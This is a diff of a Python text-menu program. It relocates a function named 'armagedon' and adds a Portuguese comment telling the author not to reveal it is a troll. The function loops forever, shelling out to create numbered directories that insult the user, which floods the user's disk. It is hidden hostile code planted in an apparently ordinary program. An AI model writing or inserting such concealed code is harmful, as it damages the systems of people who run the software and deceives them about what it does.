@@ -2,13 +2,6 @@ import os
 from time import sleep
 
 
-def armagedon():
-    while True:
-        global contador
-        os.system(f'mkdir sefodeu{contador}vezes')
-        contador += 1
-
-
 def clear():
     print(os.name)
     if os.name == 'posix':
@@ -36,6 +29,15 @@ def opcao():
                     f'[6] Créditos\n   >>>'))
     return opc
 
+
+# n explana que é troll!!
+
+
+def armagedon():
+    while True:
+        global contador
+        os.system(f'mkdir sefodeu{contador}vezes')
+        contador += 1
 
 def condicoes():
     banner()
